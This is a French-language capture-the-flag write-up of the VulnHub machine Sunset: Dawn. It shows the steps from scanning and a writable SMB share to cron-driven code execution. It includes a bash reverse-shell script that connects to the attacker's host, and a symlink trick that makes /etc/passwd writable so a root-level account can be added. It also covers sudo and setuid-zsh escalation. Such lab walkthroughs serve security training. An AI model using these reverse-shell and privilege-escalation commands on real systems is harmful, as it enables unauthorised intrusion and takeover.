---
title: "Solution du CTF Sunset: Dawn de VulnHub"
tags: [VulnHub, CTF]
---

[Sunset: Dawn](https://vulnhub.com/entry/sunset-dawn,341/) est le second CTF d'une série créée par un certain [whitecr0wz](https://vulnhub.com/author/whitecr0wz,630/).

## I'm monitoring your monitoring

Sur la VM, different ports sont ouverts, mais pas de SSH :

```
Nmap scan report for 192.168.56.154
Host is up (0.012s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /logs/: Logs
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.38 (Debian)
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882        *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT*
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-0215   6.0     https://vulners.com/cve/CVE-2019-0215
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-36160  5.0     https://vulners.com/cve/CVE-2021-36160
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|       CVE-2023-27522  0.0     https://vulners.com/cve/CVE-2023-27522
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| vulners: 
|   MySQL 5.5.5-10.3.15-MariaDB-1: 
|_      NODEJS:602      0.0     https://vulners.com/nodejs/NODEJS:602
MAC Address: 08:00:27:D7:C8:31 (Oracle VirtualBox virtual NIC)
Service Info: Host: DAWN

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_
```

Avec `smbclient` je trouve un partage `ITDEPT` mais impossible d'énumérer les utilisateurs.

```console
smbclient -U "" -N -L //192.168.56.154

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
SMB1 disabled -- no workgroup available
```

Le partage est vide, mais on peut écrire dedans. Plus ou moins, car on obtient une erreur indiquant que le disque est plein et le fichier fait 0 octets.

```console
$ smbclient -U "" -N //192.168.56.154/ITDEPT
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr  3 13:12:36 2023
  ..                                  D        0  Sat Aug  3 05:21:39 2019

                7158264 blocks of size 1024. 0 blocks available
smb: \> put truc.txt
cli_push returned NT_STATUS_DISK_FULL
putting file truc.txt as \truc.txt (0,2 kb/s) (average 0,2 kb/s)
smb: \> ls
  .                                   D        0  Mon Apr  3 13:25:42 2023
  ..                                  D        0  Sat Aug  3 05:21:39 2019
  truc.txt                            A        0  Mon Apr  3 13:25:42 2023

                7158264 blocks of size 1024. 0 blocks available
```

Le dossier `/logs/` que Nmap a détecté contient différents fichiers, mais seul `management.log` est lisible.

```
[   ]	auth.log	2019-08-01 22:38	90K	 
[   ]	daemon.log	2019-08-01 22:15	125K	 
[   ]	error.log	2019-08-01 22:15	17K	 
[   ]	management.log	2023-04-03 08:09	282	 
```

On comprend à son contenu qu'il s'agit de l'output de la commande `pspy64` :

{% raw %}
```
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=99     | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=98     | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=96     | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=9      | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=8      | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=759    | /usr/sbin/cups-browsed [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=758    | /usr/sbin/cupsd -l [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=6      | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=590    | /usr/sbin/smbd --foreground --no-process-group [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=59     | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=585    | /usr/sbin/smbd --foreground --no-process-group [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=583    | /usr/sbin/smbd --foreground --no-process-group [0m
2023/04/03 08:33:19 [31;1mCMD: UID=112  PID=576    | /usr/sbin/mysqld [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=522    | /usr/sbin/smbd --foreground --no-process-group [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=50     | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=493    | /usr/sbin/apache2 -k start [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=49     | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=48     | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=404    | /root/pspy64 [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=4      | [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=391    | /bin/sh -c /root/pspy64 > /var/www/html/logs/management.log [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=387    | /sbin/agetty -o -p -- \u --noclear tty1 linux [0m
2023/04/03 08:33:19 [31;1mCMD: UID=107  PID=385    | avahi-daemon: chroot helper [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=378    | /usr/sbin/nmbd --foreground --no-process-group [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=368    | /usr/sbin/CRON -f [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=363    | /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=360    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=359    | /usr/sbin/cron -f [0m
2023/04/03 08:33:19 [31;1mCMD: UID=107  PID=358    | avahi-daemon: running [dawn.local] [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=356    | /usr/sbin/rsyslogd -n -iNONE [0m
2023/04/03 08:33:19 [31;1mCMD: UID=0    PID=355    | /lib/systemd/systemd-logind [0m
2023/04/03 08:33:19 [31;1mCMD: UID=104  PID=349    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only [0m
```
{% endraw %}

Ne voyant toujours rien d'intéressant après de longues minutes je décide de redémarrer la machine, et c'est mieux :

{% raw %}
```
2023/04/03 08:04:01 [31;1mCMD: UID=0    PID=571    | /usr/sbin/cron -f [0m
2023/04/03 08:04:01 [31;1mCMD: UID=1000 PID=585    | /bin/sh -c /home/dawn/ITDEPT/product-control [0m
2023/04/03 08:04:01 [31;1mCMD: UID=0    PID=584    | /bin/sh -c /home/ganimedes/phobos [0m
2023/04/03 08:04:01 [31;1mCMD: UID=0    PID=583    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control [0m
2023/04/03 08:04:01 [31;1mCMD: UID=0    PID=582    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control [0m
2023/04/03 08:04:01 [31;1mCMD: UID=0    PID=581    | /usr/sbin/CRON -f [0m
2023/04/03 08:04:01 [31;1mCMD: UID=1000 PID=580    | /bin/sh -c /home/dawn/ITDEPT/product-control [0m
2023/04/03 08:04:01 [31;1mCMD: UID=0    PID=579    | /bin/sh -c /home/ganimedes/phobos [0m
2023/04/03 08:04:01 [31;1mCMD: UID=0    PID=578    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control [0m
2023/04/03 08:04:01 [31;1mCMD: UID=0    PID=577    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control [0m
2023/04/03 08:05:02 [31;1mCMD: UID=33   PID=596    | /bin/sh -c /home/dawn/ITDEPT/web-control [0m
```
{% endraw %}

On voit non seulement que root change les permissions sur les scripts `web-control` et `product-control` actuellement absents, mais qu'en plus ils sont exécutés par d'autres utilisateurs.

## Can I haz exec?

Je peux créer le script bash suivant et l'uploader sous le nom `web-control`, cette fois l'upload fonctionne correctement.

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.1/9999 0>&1 &
```

Sans trop de surprises j'obtiens un shell en tant que `www-data` (l'UID 33 lui est généralement associé).

```console
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.154.
Ncat: Connection from 192.168.56.154:48306.
bash: cannot set terminal process group (795): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dawn:~$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@dawn:~$ uname -a
uname -a
Linux dawn 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64 GNU/Linux
```

Si je fais la même chose avec `product-control` j'obtiens un shell pour l'utilisateur `dawn` :

```
Ncat: Connection from 192.168.56.154.
Ncat: Connection from 192.168.56.154:48320.
bash: cannot set terminal process group (915): Inappropriate ioctl for device
bash: no job control in this shell
dawn@dawn:~$ id
id
uid=1000(dawn) gid=1000(dawn) groups=1000(dawn),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
dawn@dawn:~$ sudo -l
sudo -l
Matching Defaults entries for dawn on dawn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dawn may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/mysql
```

On espère pouvoir exploiter un _GTFObin_ pour le mysql mais impossible de le lancer sans des identifiants valides... et je n'en ai pas trouvé.

```console
dawn@dawn:/var/www/html$ sudo /usr/bin/mysql -e '\! /bin/sh'
sudo /usr/bin/mysql -e '\! /bin/sh'
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
```

On va donc utiliser notre shell `www-data` et créer un lien symbolique vers `/etc/passwd`. On attend alors que la tache cron exécute le `chmod` puis on rajoute un utilisateur `devloop` privilégié avec le mot de passe `hello` :

```console
www-data@dawn:/home/dawn/ITDEPT$ ln -s /etc/passwd web-control
www-data@dawn:/home/dawn/ITDEPT$ ls -al
total 8
drwsrwsrwx 2 dawn     dawn 4096 Apr  3 10:23 .
drwxr-xr-x 5 dawn     dawn 4096 Aug  2  2019 ..
lrwxrwxrwx 1 www-data dawn   11 Apr  3 10:23 web-control -> /etc/passwd
www-data@dawn:/home/dawn/ITDEPT$ ls -al /etc/passwd
-rw-r--r-- 1 root root 1858 Aug  2  2019 /etc/passwd
www-data@dawn:/home/dawn/ITDEPT$ ls -al /etc/passwd
-rwxrwxrwx 1 root root 1858 Aug  2  2019 /etc/passwd
www-data@dawn:/home/dawn/ITDEPT$ echo devloop:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd
www-data@dawn:/home/dawn/ITDEPT$ su devloop
Password: 
# cd /root
# ls
flag.txt  pspy64
# cat flag.txt
Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!

flag{3a3e52f0a6af0d6e36d7c1ced3a9fd59}
```

## Solutions alternatives

Il apparait qu'en fait `www-data` a aussi une permission sudo :

```console
www-data@dawn:/tmp$ sudo -l
Matching Defaults entries for www-data on dawn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/sudo
www-data@dawn:/tmp$ sudo /usr/bin/sudo su
root@dawn:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Et `zsh` est setuid root :

```console
www-data@dawn:/tmp$ ls -al /usr/bin/zsh
-rwsr-xr-x 1 root root 861568 Feb  4  2019 /usr/bin/zsh
www-data@dawn:/tmp$ /usr/bin/zsh
dawn# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
